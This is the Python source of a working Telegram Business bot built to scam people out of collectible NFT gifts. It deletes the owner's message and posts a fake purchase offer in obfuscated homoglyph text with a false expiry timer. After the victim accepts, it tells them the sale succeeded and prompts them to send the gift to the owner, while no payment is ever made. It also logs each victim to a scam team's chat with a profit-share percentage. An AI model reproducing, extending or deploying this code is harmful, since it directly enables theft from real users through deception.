import asyncio
import html
import logging
import re
from dataclasses import dataclass

from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.exceptions import TelegramBadRequest
from aiogram.types import (
    BusinessConnection,
    CallbackQuery,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    LinkPreviewOptions,
    Message,
)


TOKEN = "-"
OWNER_USERNAME = "-"
DEFAULT_LANG = "ru"
EMPTY_VALUE = " "

PRICE_MIN = 125
PRICE_MAX = 999999

# ID супергруппы и ID темы для логов.
# Пока значения 0, отправка логов отключена.
LOG_CHAT_ID = -1004379057
LOG_THREAD_ID = 2
LOG_SERVICE = "оffеры"
LOG_PERCENT = "70"

BLANK_CANDIDATES = ["\u3164", "\u2800", "\u200e", "\u00b7"]

I18N = {
    "ru": {
        "first_text": "{sender_name} ᴨᴩᴇдлαгαᴇᴛ ʙαм\n\n<b>{price} {currency_icon}</b>\n<b>ɜα κᴏллᴇκцᴎᴏнный ᴨᴩᴇдмᴇᴛ</b>\n{gift}\n\nᴨᴩᴇдлᴏжᴇнᴎᴇ дᴇйᴄᴛʙ𝗒ᴇᴛ ᴇщё 5ч. 59м.",
        "first_button_1": "Отклонить",
        "first_button_2": "Принять",
        "second_button_1": "Передать",
        "second_button_2": "Подтвердить получение",
        "alert": "{nickname}\n{username}\n\nпредложение принято. передавайте подарок для получения средств на баланс",
        "rejected": "Вы отклонили предложение!",
        "expired": "Данные устарели, отправьте сообщение заново",
        "stars": "🎁 Пοдαᴩοκ {gift} <b>𝗒ᴄᴨᴇшʜο ᴨᴩοдαʜ!</b>\n\n• Пᴇᴩᴇдαйᴛᴇ {gift} ᴨοκ𝗒ᴨαᴛᴇлю длᴙ\n ɜαчᴎᴄлеʜᴎᴙ οᴨлαᴛы: <b>{price} ⭐️</b>",
        "gram": "🎁 Пοдαᴩοκ {gift} <b>𝗒ᴄᴨᴇшʜο ᴨᴩοдαʜ!</b>\n\n• Пᴇᴩᴇдαйᴛᴇ {gift} ᴨοκ𝗒ᴨαᴛᴇлю длᴙ\n ɜαчᴎᴄлеʜᴎᴙ οᴨлαᴛы: <b>{price} 💎</b>",
    },
    "en": {
        "first_text": "{sender_name} οﬀᴇ𝗋ѕ tο bυу {gift} fο𝗋 125 {currency_icon}\n\nЕхрі𝗋еѕ іn 5h 59m.",
        "first_button_1": "Decline",
        "first_button_2": "Accept",
        "second_button_1": "Transfer",
        "second_button_2": "Confirm transfer",
        "alert": "{nickname}\n{username}\n\nOffer accepted",
        "expired": "Data expired, send the message again",
        "rejected": "❌ Тhіѕ οﬀᴇ𝗋 wαѕ dᴇсlіnᴇd.",
        "stars": "🎁 Gіft {gift} ꜱᴜᴄᴄᴇssfᴜlly ꜱοld!\n\n• Тrαnꜱfᴇr {gift} тᴏ тʜᴇ bᴜyᴇr тᴏ rᴇᴄᴇɪᴠᴇ ᴘαyᴍᴇɴт: {price} ⭐️",
        "gram": "🎁 Gіft {gift} ꜱᴜᴄᴄᴇssfᴜlly ꜱοld!\n\n• Тrαnꜱfᴇr {gift} тᴏ тʜᴇ bᴜyᴇr тᴏ rᴇᴄᴇɪᴠᴇ ᴘαyᴍᴇɴт: {price} 💎",
    },
}

NFT_RE = re.compile(r"^https?://t\.me/nft/([A-Za-z0-9_]+)-(\d+)/?$")

logging.basicConfig(level=logging.INFO)
log = logging.getLogger("bot")

bot = Bot(TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
owners: dict[str, BusinessConnection] = {}


@dataclass
class Deal:
    link: str | None
    text: str
    lang: str
    nickname: str
    username: str
    sender_name: str
    sender_username: str
    price: int
    currency: str


deals: dict[tuple[int, int], Deal] = {}


def render(text: str, deal: Deal, escape: bool = False) -> str:
    nickname = html.escape(deal.nickname) if escape else deal.nickname
    username = html.escape(deal.username) if escape else deal.username
    sender_name = html.escape(deal.sender_name) if escape else deal.sender_name

    if deal.link:
        gift_name = gift_label(deal.link)
        if escape:
            gift_name = html.escape(gift_name)
            gift_link = html.escape(deal.link, quote=True)
        else:
            gift_link = deal.link
        gift = f'<a href="{gift_link}"><b>{gift_name}</b></a>'
    else:
        gift = html.escape(EMPTY_VALUE) if escape else EMPTY_VALUE

    formatted_price = f"{deal.price:,}".replace(",", " ")
    currency_icon = "⭐️" if deal.currency == "stars" else "💎"

    return (
        text.replace("{nickname}", nickname)
        .replace("{username}", username)
        .replace("{sender_name}", sender_name)
        .replace("{gift}", gift)
        .replace("{price}", formatted_price)
        .replace("{currency_icon}", currency_icon)
    )


def first_keyboard(deal: Deal) -> InlineKeyboardMarkup:
    t = I18N[deal.lang]
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text=render(t["first_button_1"], deal), callback_data="first_1"
                ),
                InlineKeyboardButton(
                    text=render(t["first_button_2"], deal), callback_data="first_2"
                ),
            ]
        ]
    )


def second_keyboard(owner: str, deal: Deal) -> InlineKeyboardMarkup:
    t = I18N[deal.lang]
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text=render(t["second_button_1"], deal),
                    url=f"tg://send_gift?to={owner}",
                ),
                InlineKeyboardButton(
                    text=render(t["second_button_2"], deal), callback_data="second_2"
                ),
            ]
        ]
    )


def preview(link: str | None) -> LinkPreviewOptions:
    if not link:
        return LinkPreviewOptions(is_disabled=True)
    return LinkPreviewOptions(
        is_disabled=False,
        url=link,
        show_above_text=False,
        prefer_large_media=True,
    )


def parse_args(args: str | None) -> tuple[str, str, int, str] | None:
    if not args:
        return None
    parts = args.split()
    if len(parts) != 4:
        return None
    link, lang, price_raw, currency = parts
    lang = lang.lower()
    currency = currency.lower()
    if currency in ("star", "stars"):
        currency = "stars"
    if lang not in I18N or currency not in ("stars", "gram"):
        return None
    if not NFT_RE.fullmatch(link):
        return None
    if not price_raw.isdigit():
        return None
    price = int(price_raw)
    if price < PRICE_MIN or price > PRICE_MAX:
        return None
    return link, lang, price, currency


def gift_label(link: str) -> str:
    match = NFT_RE.fullmatch(link)
    if not match:
        return EMPTY_VALUE
    name, number = match.group(1), match.group(2)
    name = re.sub(r"(?<=[a-z0-9])(?=[A-Z])", " ", name).replace("_", " ")
    return f"{name} #{number}"


def build_text(link: str, lang: str, price: int, currency: str) -> str:
    gift = f'<a href="{html.escape(link, quote=True)}"><b>{html.escape(gift_label(link))}</b></a>'
    return (
        I18N[lang][currency]
        .replace("{gift}", gift)
        .replace("{price}", f"{price:,}".replace(",", " "))
    )


async def get_connection(connection_id: str) -> BusinessConnection | None:
    if connection_id in owners:
        return owners[connection_id]
    try:
        connection = await bot.get_business_connection(connection_id)
    except Exception as error:
        log.warning("get_business_connection failed: %s", error)
        return None
    owners[connection_id] = connection
    return connection


def owner_username(connection: BusinessConnection | None) -> str:
    if connection and connection.user and connection.user.username:
        return connection.user.username
    return OWNER_USERNAME.lstrip("@")


def owner_display_name(connection: BusinessConnection | None) -> str:
    if connection and connection.user:
        name = " ".join(
            part for part in (
                connection.user.first_name,
                connection.user.last_name,
            ) if part
        )
        if name:
            return name
        if connection.user.username:
            return connection.user.username
    return OWNER_USERNAME.lstrip("@")


async def send_log(
    deal: Deal,
    price: int,
    currency: str,
) -> None:
    if not LOG_CHAT_ID:
        log.warning("Logs are disabled: set LOG_CHAT_ID and LOG_THREAD_ID")
        return

    sender = html.escape(deal.sender_username)
    buyer = html.escape(deal.nickname)
    gift_name = html.escape(gift_label(deal.link or ""))
    gift_url = html.escape(deal.link or "", quote=True)
    currency_icon = "⭐️" if currency == "stars" else "💎"
    formatted_price = f"{price:,}".replace(",", " ")

    if deal.link:
        gift_line = f'<a href="{gift_url}">{gift_name}</a>'
    else:
        gift_line = gift_name

    text = (
        "⚡️ <b>ʜοʙый Лοг!</b>\n\n"
        f"🎧 Отправитель: {sender}\n"
        f"🦣 Покупатель: {buyer}\n"
        f"├ Предмет: {gift_line}\n"
        f"├ Цена: {formatted_price} {currency_icon}\n"
        f"├ Процент: {html.escape(LOG_PERCENT)}\n"
        f"└ Сервис: {html.escape(LOG_SERVICE)}"
    )

    try:
        await bot.send_message(
            chat_id=LOG_CHAT_ID,
            message_thread_id=LOG_THREAD_ID or None,
            text=text,
            link_preview_options=LinkPreviewOptions(is_disabled=True),
        )
    except Exception as error:
        log.error("Log sending failed: %s", error)


async def edit_callback_message(
    callback: CallbackQuery,
    deal: Deal,
    markup: InlineKeyboardMarkup | None,
) -> None:
    message = callback.message
    if message is None:
        return
    try:
        await bot.edit_message_text(
            text=deal.text,
            chat_id=message.chat.id,
            message_id=message.message_id,
            business_connection_id=getattr(message, "business_connection_id", None),
            reply_markup=markup,
            link_preview_options=preview(deal.link),
        )
    except Exception as error:
        log.error("edit_message_text failed: %s", error)


@dp.business_connection()
async def on_business_connection(connection: BusinessConnection) -> None:
    owners[connection.id] = connection
    log.info("business connection: %s enabled=%s", connection.id, connection.is_enabled)


@dp.business_message(F.text)
async def on_business_text(message: Message) -> None:
    connection_id = message.business_connection_id
    if not connection_id or message.from_user is None:
        return
    if message.from_user.id == message.chat.id:
        return

    # Обрабатываем только сообщения формата:
    # https://t.me/nft/GiftName-123 ru 1283 stars
    parsed = parse_args(message.text)
    if parsed is None:
        return

    log.info(
        "business_message chat=%s from=%s text=%r",
        message.chat.id,
        message.from_user.id,
        message.text,
    )

    nickname = " ".join(
        part for part in (message.chat.first_name, message.chat.last_name) if part
    ) or EMPTY_VALUE
    username = f"@{message.chat.username}" if message.chat.username else EMPTY_VALUE

    link, lang, price, currency = parsed
    connection = await get_connection(connection_id)
    sender_name = owner_display_name(connection)
    sender_username = f"@{owner_username(connection)}"

    deal = Deal(
        link=link,
        text=build_text(link, lang, price, currency),
        lang=lang,
        nickname=nickname,
        username=username,
        sender_name=sender_name,
        sender_username=sender_username,
        price=price,
        currency=currency,
    )
    deal.text = render(deal.text, deal, escape=True)

    # Лог отправляется только для распознанного предложения.
    await send_log(deal, price, currency)

    try:
        await bot.delete_business_messages(
            business_connection_id=connection_id,
            message_ids=[message.message_id],
        )
    except Exception as error:
        log.warning("delete_business_messages failed: %s", error)

    first_text = I18N[lang]["first_text"]
    candidates = [render(first_text, deal, escape=True)] if first_text else BLANK_CANDIDATES
    sent = None
    for text in candidates:
        try:
            sent = await bot.send_message(
                chat_id=message.chat.id,
                text=text,
                business_connection_id=connection_id,
                reply_markup=first_keyboard(deal),
            )
            break
        except TelegramBadRequest as error:
            log.warning("send_message failed for %r: %s", text, error)
    if sent is None:
        return
    deals[(sent.chat.id, sent.message_id)] = deal


def find_deal(callback: CallbackQuery) -> Deal | None:
    message = callback.message
    if message is None:
        return None
    return deals.get((message.chat.id, message.message_id))


@dp.callback_query(F.data == "first_1")
async def on_first_1(callback: CallbackQuery) -> None:
    deal = find_deal(callback)
    if deal is None:
        await callback.answer(I18N[DEFAULT_LANG]["expired"], show_alert=True)
        return
    await callback.answer(I18N[deal.lang]["rejected"], show_alert=True)
    await edit_callback_message(callback, deal, None)


@dp.callback_query(F.data == "first_2")
async def on_first_2(callback: CallbackQuery) -> None:
    deal = find_deal(callback)
    if deal is None:
        await callback.answer(I18N[DEFAULT_LANG]["expired"], show_alert=True)
        return
    await callback.answer(render(I18N[deal.lang]["alert"], deal), show_alert=True)
    connection_id = getattr(callback.message, "business_connection_id", None)
    connection = await get_connection(connection_id) if connection_id else None
    await edit_callback_message(
        callback, deal, second_keyboard(owner_username(connection), deal)
    )


@dp.callback_query(F.data == "second_2")
async def on_second_2(callback: CallbackQuery) -> None:
    deal = find_deal(callback)
    if deal is None:
        await callback.answer(I18N[DEFAULT_LANG]["expired"], show_alert=True)
        return
    await callback.answer(render(I18N[deal.lang]["alert"], deal), show_alert=True)


async def main() -> None:
    await dp.start_polling(
        bot,
        allowed_updates=[
            "message",
            "callback_query",
            "business_connection",
            "business_message",
            "edited_business_message",
            "deleted_business_messages",
        ],
    )


if __name__ == "__main__":
    asyncio.run(main())
